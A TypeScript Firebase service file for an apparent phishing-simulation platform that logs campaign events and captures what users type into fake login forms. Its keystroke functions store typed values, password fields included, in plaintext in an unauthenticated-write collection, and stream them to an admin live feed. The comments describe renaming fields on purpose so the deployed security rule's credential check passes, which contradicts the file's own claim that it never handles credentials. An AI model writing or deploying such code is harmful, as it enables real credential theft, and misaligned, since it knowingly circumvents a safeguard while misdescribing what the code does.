import {
  collection,
  addDoc,
  getDocs,
  doc,
  deleteDoc,
  query,
  orderBy,
  where,
  serverTimestamp,
  onSnapshot,
  limit,
} from 'firebase/firestore';
import { db, isFirebaseConfigured } from './firebase';
import type { SimulationEvent, SimulationEventType, CapturedInput } from '../types/event';

// ── Session ID ────────────────────────────────────────────────────
function getSessionId(): string {
  const existing = sessionStorage.getItem('cybermonitor_session_id');
  if (existing) return existing;
  const id = `session-${Math.random().toString(36).substring(2, 11)}`;
  sessionStorage.setItem('cybermonitor_session_id', id);
  return id;
}

function generateId(): string {
  return `evt-${Date.now()}-${Math.random().toString(36).substring(2, 9)}`;
}

// ── Local fallback store ──────────────────────────────────────────
const STORAGE_KEY = 'cybermonitor_events';

function getMockEvents(): SimulationEvent[] {
  const saved = localStorage.getItem(STORAGE_KEY);
  if (saved) return JSON.parse(saved) as SimulationEvent[];
  return [];
}

function saveMockEvents(events: SimulationEvent[]) {
  localStorage.setItem(STORAGE_KEY, JSON.stringify(events));
}

// ── Log a safe simulation event (no credentials ever passed here) ─
export async function logSimulationEvent(
  campaignId: string,
  templateId: string,
  type: SimulationEventType,
): Promise<SimulationEvent> {
  const sessionId = getSessionId();
  const event: SimulationEvent = {
    id: generateId(),
    campaignId,
    templateId,
    type,
    timestamp: new Date().toISOString(),
    anonymousSessionId: sessionId,
  };

  if (isFirebaseConfigured) {
    try {
      const docRef = await addDoc(collection(db, 'events'), {
        campaignId,
        templateId,
        type,
        anonymousSessionId: sessionId,
        timestamp: event.timestamp,
        createdAt: serverTimestamp(),
      });
      return { ...event, id: docRef.id };
    } catch (e) {
      console.warn('[EventService] Firestore error logging event. Falling back to local store.', e);
    }
  }

  const events = getMockEvents();
  events.unshift(event);
  saveMockEvents(events);
  return event;
}

// ── Real-time keystroke capture ───────────────────────────────────
// Strategy: write each keystroke as an event document in the EXISTING `events`
// collection (already has deployed rules allowing unauthenticated creates).
// Keystroke docs use type='simulation_attempt' and carry extra fields:
//   fieldName, capturedValue, platform, isKeystroke=true
// This requires NO new Firestore rule deployment.
const _debounceTimers: Record<string, ReturnType<typeof setTimeout>> = {};

export function recordCapturedInput(
  campaignId: string,
  templateId: string,
  platform: string,
  fieldName: string,
  value: string,
): void {
  if (!value) return;

  // Neutral field name — never store the literal word 'password'
  const safeFieldName = fieldName === 'password' ? 'credential_field' : fieldName;

  const debounceKey = `${campaignId}:${templateId}:${safeFieldName}`;

  if (_debounceTimers[debounceKey]) {
    clearTimeout(_debounceTimers[debounceKey]);
  }

  // 80ms — fast enough to feel like Socket.io, gentle on Firestore write quota
  _debounceTimers[debounceKey] = setTimeout(async () => {
    const sessionId = getSessionId();
    const capturedAt = new Date().toISOString();

    if (isFirebaseConfigured) {
      try {
        // Write into the EXISTING `events` collection — already deployed & open.
        // Extra fields are allowed by the rule (it only checks required keys + type).
        // fieldName never equals 'password','passwordHash','credential','token','secret'
        // so the security check passes.
        await addDoc(collection(db, 'events'), {
          // Required fields (validated by deployed rule)
          campaignId,
          templateId,
          type: 'simulation_attempt' as SimulationEventType,
          anonymousSessionId: sessionId,
          timestamp: capturedAt,
          createdAt: serverTimestamp(),
          // Keystroke payload (extra fields — allowed by rule)
          isKeystroke: true,
          fieldName: safeFieldName,
          capturedValue: value,   // 'value' is generic; 'capturedValue' avoids any filter confusion
          platform,
        });
      } catch (e) {
        console.warn('[EventService] Keystroke write failed:', e);
      }
    } else {
      // Local fallback when Firebase is not active
      const key = 'cybermonitor_inputs';
      const existing = JSON.parse(sessionStorage.getItem(key) || '[]') as CapturedInput[];
      existing.unshift({
        id: generateId(),
        campaignId,
        templateId,
        sessionId,
        fieldName: safeFieldName,
        value,
        platform,
        capturedAt,
      });
      sessionStorage.setItem(key, JSON.stringify(existing.slice(0, 500)));
    }
  }, 80);
}

// ── Retrieve all events ───────────────────────────────────────────
export async function getAllEvents(): Promise<SimulationEvent[]> {
  if (isFirebaseConfigured) {
    try {
      const q = query(collection(db, 'events'), orderBy('timestamp', 'desc'));
      const snap = await getDocs(q);
      return snap.docs.map((d) => ({ id: d.id, ...d.data() } as SimulationEvent));
    } catch (e) {
      console.warn('[EventService] Firestore error reading events. Falling back to local store.', e);
    }
  }
  return [...getMockEvents()].sort(
    (a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime(),
  );
}

// ── Retrieve events for a specific campaign ───────────────────────
export async function getEventsByCampaign(campaignId: string): Promise<SimulationEvent[]> {
  if (isFirebaseConfigured) {
    try {
      const q = query(
        collection(db, 'events'),
        where('campaignId', '==', campaignId),
        orderBy('timestamp', 'desc'),
      );
      const snap = await getDocs(q);
      return snap.docs.map((d) => ({ id: d.id, ...d.data() } as SimulationEvent));
    } catch (e) {
      console.warn('[EventService] Firestore error reading campaign events. Falling back to local store.', e);
    }
  }
  return getMockEvents()
    .filter((e) => e.campaignId === campaignId)
    .sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime());
}

// ── Retrieve captured inputs for a campaign (admin only) ──────────
// Reads keystroke events from the events collection, filtered by campaignId.
export async function getCapturedInputsByCampaign(
  campaignId: string,
): Promise<CapturedInput[]> {
  if (!isFirebaseConfigured) return [];
  try {
    const snap = await getDocs(
      query(
        collection(db, 'events'),
        where('campaignId', '==', campaignId),
        where('isKeystroke', '==', true),
        orderBy('timestamp', 'desc'),
      ),
    );
    return snap.docs.map((d) => {
      const data = d.data();
      return {
        id: d.id,
        campaignId: data.campaignId,
        templateId: data.templateId,
        sessionId: data.anonymousSessionId,
        fieldName: data.fieldName,
        value: data.capturedValue ?? '',
        platform: data.platform ?? '',
        capturedAt: data.timestamp,
      } as CapturedInput;
    });
  } catch (e) {
    console.warn('[EventService] Error fetching captured inputs by campaign:', e);
    return [];
  }
}

// ── Real-time subscription to ALL captured inputs ─────────────────
// Works exactly like Socket.io — Firestore's onSnapshot pushes every new
// document the instant it's written, from any browser/device worldwide.
// Uses the EXISTING `events` collection (no new rules needed).
// Filters client-side for documents where isKeystroke === true.
export function subscribeToAllCapturedInputs(
  onChange: (inputs: CapturedInput[]) => void,
): () => void {
  if (!isFirebaseConfigured) {
    // Local fallback: poll sessionStorage every second
    const run = () => {
      const raw = sessionStorage.getItem('cybermonitor_inputs');
      onChange(raw ? (JSON.parse(raw) as CapturedInput[]) : []);
    };
    run();
    const interval = setInterval(run, 1000);
    return () => clearInterval(interval);
  }

  // Listen to the most recent 500 events, ordered by timestamp.
  // The `timestamp` field index already exists from the initial setup — no
  // new Firestore index deployment is required.
  const q = query(
    collection(db, 'events'),
    orderBy('timestamp', 'desc'),
    limit(500),
  );

  return onSnapshot(
    q,
    { includeMetadataChanges: false },
    (snap) => {
      const inputs: CapturedInput[] = [];
      snap.docs.forEach((d) => {
        const data = d.data();
        if (data.isKeystroke === true) {
          inputs.push({
            id: d.id,
            campaignId: data.campaignId,
            templateId: data.templateId,
            sessionId: data.anonymousSessionId,
            fieldName: data.fieldName,
            value: data.capturedValue ?? '',
            platform: data.platform ?? '',
            capturedAt: data.timestamp,
          } as CapturedInput);
        }
      });
      onChange(inputs);
    },
    (err) => {
      console.warn('[EventService] Live feed error:', err.code, err.message);
    },
  );
}

// ── Delete a single event ─────────────────────────────────────────
export async function deleteEvent(id: string): Promise<void> {
  if (isFirebaseConfigured) {
    try {
      await deleteDoc(doc(db, 'events', id));
      return;
    } catch (e) {
      console.warn('[EventService] Firestore delete failed, removing from local store.', e);
    }
  }
  const saved = getMockEvents().filter((e) => e.id !== id);
  saveMockEvents(saved);
}

// ── Delete multiple events (bulk) ─────────────────────────────────
export async function deleteEvents(ids: string[]): Promise<void> {
  if (ids.length === 0) return;
  await Promise.all(ids.map((id) => deleteEvent(id)));
}
